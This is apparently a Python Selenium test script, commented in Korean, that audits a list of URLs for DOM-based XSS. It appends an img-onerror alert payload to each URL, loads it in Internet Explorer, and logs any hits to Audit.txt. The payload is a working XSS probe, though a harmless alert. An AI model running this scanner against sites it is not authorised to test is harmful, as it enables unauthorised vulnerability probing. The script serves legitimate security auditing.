# -*- coding:utf-8 -*-

import unittest
import time
from selenium import webdriver

def readFile():
    with open("url.txt", "r") as f:
        lines = f.readlines()
    return lines


def printW(num, url, msg):
    print(msg)
    with open("Audit.txt", "a") as f:
        f.write("\n[{}] Checking: {}".format(num, url))
        f.write(msg + "\n")


class OpenTests(unittest.TestCase):

    def setUp(self):
        # create a new IE session
        from selenium.common.exceptions import WebDriverException

        try:
            self.driver = webdriver.Ie()
        except WebDriverException as e:
            print("\n\n***모든 영역 탭에서 보호모드 설정을 체크해야합니다.***")
            print("(인터넷, 로컬인트라넷, 신뢰사이트, 제한사이트)\n")

        self.driver.implicitly_wait(30)
        self.wHandler = self.driver.current_window_handle
        self.driver.set_page_load_timeout(30)
        self.FileCreation = 0

    def testDom(self):
        from selenium.webdriver.support import expected_conditions as EC
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.common.exceptions import NoAlertPresentException
        from selenium.common.exceptions import UnexpectedAlertPresentException
        from selenium.common.exceptions import TimeoutException

        driver = self.driver
        testURL = 'http://테스트페이지/'
        PAYLOAD = '#<img/**/src="x"onerror="alert(1234);"/>'

        lines = readFile()
        num = 0

        for url in lines:

            num = num + 1
            print("\n[{}] Checking: {}".format(num, url), end='')

            # 테스트용 코드
            # driver.get(url+PAYLOAD)
            # 공격 맞춤 코드
            urlA = testURL + url + PAYLOAD

            try:

                driver.get(urlA)

                if EC.alert_is_present():
                    time.sleep(1)
                    alert = driver.switch_to.alert
                    alert.accept()
                    printW(num, urlA, "[*] Result: DOM XSS")
                    self.FileCreation = 1

                driver.switch_to.window(self.wHandler)

            # 페이지 로딩 타임아웃
            except TimeoutException as e:
                printW(num, urlA, "타임아웃 [확인요망]")
                pass

            # DOM XSS안전함
            except NoAlertPresentException as e:
                print("[-] Result: Safe")

            # 그 밖의 팝업창
            except UnexpectedAlertPresentException as e:
                printW(num, urlA, "[X] 예기치 못한 팝업창 [확인요망]")
                self.FileCreation = 1

            # 그 밖에 예외처리
            except Exception as e:
                printW(num, urlA, "[X] Error: " + str(e))
                self.FileCreation = 1

    # 모든 드라이버와 관련된 브라우저 종료
    def tearDown(self):
        print("\n[*] Complete to audit.")

        import os
        import sys
        if self.FileCreation == 1:
            print('\n--- Check out the \"Audit.txt\" ---\n')
            try:
                os.system('Audit.txt')
            except Exception as e:
                print(str(e))

        self.driver.quit()


if __name__ == '__main__':
    # verbosity는 테스트 결과에 대해 console에 출력되는 상세함 정도를 결정함
    unittest.main(verbosity=2)

'''
익스플로어 드라이버 버그. 다른 사이트로 get하려면 레지스트리 값을 등록해야된다.
?For IE 11 only, you will need to set a registry entry on the target computer 
so that the driver can maintain a connection to the instance of Internet Explorer it creates. 
For 32-bit Windows installations, 
the key you must examine in the registry editor is  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BFCACHE . 
For 64-bit Windows installations, the key is  
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BFCACHE . 
Please note that the  FEATURE_BFCACHE  subkey may or may not be present, and should be created if it is not present. 
Important: Inside this key, create a DWORD value named  iexplore.exe  with the value of 0.
'''